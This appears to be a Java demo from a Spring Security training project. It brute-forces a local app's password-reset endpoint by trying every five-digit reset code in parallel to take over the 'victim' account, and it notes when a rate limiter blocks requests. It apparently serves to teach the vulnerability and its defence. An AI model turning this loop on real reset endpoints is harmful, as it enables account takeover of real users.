package victor.training.spring.security.vulnerability;

import ch.qos.logback.classic.Level;
import org.springframework.http.HttpStatus;
import org.springframework.web.client.HttpStatusCodeException;
import org.springframework.web.client.RestClientException;
import org.springframework.web.client.RestTemplate;
import victor.training.spring.security.vulnerability.BruteForce.ResetStep2Request;

import java.util.concurrent.atomic.AtomicInteger;
import java.util.stream.IntStream;

public class BruteForceAttacker {
  public static final int MIN = 10_000;
  public static final int MAX = 99_999;
  public static void main(String[] args) {
    setLoggingLevel(Level.INFO);
    AtomicInteger countDone = new AtomicInteger(0);
    AtomicInteger attemptsSent = new AtomicInteger(0);
    AtomicInteger lastPercent = new AtomicInteger(0);
    RestTemplate rest = new RestTemplate();
    rest.getForObject("http://localhost:8080/user/victim/reset-password/step1", String.class);
    boolean success = IntStream.rangeClosed(MIN, MAX)
            .parallel()

            .mapToObj(i -> {
              try {
                String s = rest.postForObject("http://localhost:8080/user/victim/reset-password/step2",
                        new ResetStep2Request(i, "hacked")
                        , String.class);
                System.out.println("Got " + s + ". Successfully reset victim's password ");
                return true;
              } catch (RestClientException e) {
                if (e instanceof HttpStatusCodeException
                    && ((HttpStatusCodeException) e).getStatusCode() == HttpStatus.TOO_MANY_REQUESTS) {
                  return false; // blocked by rate limiter
                }
                attemptsSent.incrementAndGet();
                return false;
              }
            })
            .peek(i -> {
              int n = countDone.incrementAndGet();
              int percent = (int) (100f * n / (MAX-MIN));
              if (n %((MAX-MIN)/100) ==0 ) {
                System.out.println(percent + "%");
              }
            })
            .anyMatch(e -> e);
    System.out.println("Attempts successfully sent = " + attemptsSent.get());
    System.out.println("EXPERIMENT SUCCESS (the victim's password was changed): " + success);
  }

  public static void setLoggingLevel(Level level) {
    ch.qos.logback.classic.Logger root = (ch.qos.logback.classic.Logger) org.slf4j.LoggerFactory.getLogger(ch.qos.logback.classic.Logger.ROOT_LOGGER_NAME);
    root.setLevel(level);
  }
}
